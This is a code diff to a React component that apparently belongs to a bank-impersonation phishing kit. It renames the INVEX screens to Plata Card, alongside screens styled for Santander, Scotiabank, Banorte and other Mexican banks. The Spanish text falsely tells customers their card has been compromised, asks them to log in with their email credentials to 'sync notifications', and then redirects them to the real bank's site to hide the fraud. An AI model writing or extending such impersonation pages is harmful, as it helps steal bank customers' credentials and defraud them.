@@ -911,7 +911,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 Estimado/a cliente: {screenData.titular || "ejemplo"}
               </p>
               <p className="mb-3">
-                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta INVEX con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
+                El sistema ha concluido un análisis de seguridad y ha detectado que su tarjeta Plata Card con terminación {screenData.terminacion || "Ejemplo"} ha sido vulnerada, lo que significa que sus datos personales han sido comprometidos.
               </p>
               <p className="mb-3">
                 Por protocolo de seguridad, su tarjeta será enviada al área de Prevención de Fraudes, donde se llevará a cabo un análisis técnico forense para identificar el origen de la vulnerabilidad y proceder con las medidas de protección necesarias.
@@ -971,7 +971,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               
               <p className="mb-1">Atentamente,</p>
               <p className="mb-1">Departamento de Atención a Clientes</p>
-              <p className="font-semibold">INVEX</p>
+              <p className="font-semibold">Plata Card</p>
             </div>
             
             <Button 
@@ -1129,7 +1129,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 banco === 'AMEX' ? 'amex-bg' :
                 banco === 'SANTANDER' ? 'santander-bg' :
                 banco === 'SCOTIABANK' ? 'scotiabank-bg' :
-                banco === 'INVEX' ? 'invex-bg' :
+                banco === 'PLATACARD' ? 'platacard-bg' :
                 'bg-[#EC1C24]'
               } animate-progress-bar`}></div>
             </div>
@@ -1178,7 +1178,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             
             <p className="text-[15px] text-gray-700 mb-6">
-              Para sincronizar tus notificaciones con la aplicación <strong>Invex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
+              Para sincronizar tus notificaciones con la aplicación <strong>Plata Card Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
             </p>
             
             <Input 
@@ -1318,7 +1318,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>
             
             <p className="text-sm text-gray-600 mb-6 self-start">
-              Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
+              Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
             </p>
             
             {!hotmailStep2 ? (
@@ -1425,7 +1425,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>
                 
                 <p className="text-sm text-gray-700 mb-6 w-full text-left">
-                  Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
+                  Para sincronizar tus notificaciones con la aplicación Plata Card Control, inicia sesión utilizando tu correo electrónico registrado.
                 </p>
                 
                 <div className="w-full mb-5">
@@ -1686,7 +1686,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'SCOTIABANK':
         return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
-      case 'INVEX':
+      case 'PLATACARD':
         return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
       case 'BANREGIO':
         return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
@@ -1704,7 +1704,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     if (currentScreen === ScreenType.GENERANDO_ACLARACION) {
       // Temporizador para la redirección (3 segundos)
       const redirectTimer = setTimeout(() => {
-        window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
+        window.location.href = 'https://www.platacard.com/';
       }, 3000);
       
       // Limpieza del temporizador si el componente se desmonta
@@ -1726,7 +1726,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'AMEX': return 'bg-[#0077C8] text-white p-2';
       case 'SANTANDER': return 'santander-header';
       case 'SCOTIABANK': return 'scotiabank-header';
-      case 'INVEX': return 'invex-header';
+      case 'PLATACARD': return 'platacard-header';
       case 'BANREGIO': return 'banregio-header';
       case 'BANORTE': return 'banorte-header';
       default: return 'bg-gray-100 p-3 text-center font-semibold';
@@ -1745,7 +1745,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
       case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
       case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
-      case 'INVEX': return 'bg-white p-4 rounded-lg shadow invex-container';
+      case 'PLATACARD': return 'bg-white p-4 rounded-lg shadow platacard-container';
       case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
       case 'BANORTE': return 'banorte-container';
       default: return '';
